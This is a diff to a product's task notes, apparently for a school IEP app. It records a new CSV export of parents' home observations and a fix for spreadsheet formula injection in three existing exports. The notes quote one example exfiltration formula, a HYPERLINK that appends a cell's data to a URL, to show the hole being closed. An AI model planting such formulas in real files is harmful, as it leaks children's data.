@@ -345,9 +345,26 @@ the live database rather than against memory.
       `fee_cents` has been on the table since db/073 and is null on every row
       because nobody has priced a specialist's afternoon.
       `raise_appointment_invoice()` is ready for the day there is a figure.
-- [ ] **P03 — no export.** "An Export button must allow parents to save these
-      notes as a PDF or CSV file." The individual's JSON export and the
-      Progress print stylesheet are both precedents.
+- [x] ~~**P03 — no export.**~~ "Export as a spreadsheet" on Home Observations.
+      CSV rather than PDF because these are rows — a date, a category and two
+      pieces of text — which is a spreadsheet's shape and not a document's; the
+      Progress report is the one that prints. It exports the whole history
+      rather than the filtered view, and names the author, because both
+      guardians write here and a file with no names loses which of them said
+      what the moment it leaves the product.
+
+      **It also closed a hole that was already open in three other exports.**
+      `AuditLog`, `RecordAccess` and `Courses` each had a local escaper that
+      quoted correctly and did nothing about formula injection: a cell
+      beginning `=`, `+`, `-`, `@` or a tab is evaluated by Excel, Numbers and
+      Sheets on open. Free text in this product is written by parents and
+      teachers, so `=HYPERLINK("http://…"&A1,"click")` in an observation would
+      put a child's data one click from leaving, inside a file the school
+      believes it produced itself. `src/lib/csv.ts` prefixes an apostrophe —
+      what spreadsheets write themselves — rather than stripping the character,
+      because "-2 hours of sleep" is a thing people write. Eleven unit tests,
+      and proved end to end by typing a real HYPERLINK formula into a real
+      observation and reading it back out of the download defused.
 - [ ] **FR24, the half that is clearly a parent's** — "request specialist
       progress reviews". Creating SMART goals is the other half and I would
       argue against it: a goal a parent adds to a school's IEP that no teacher
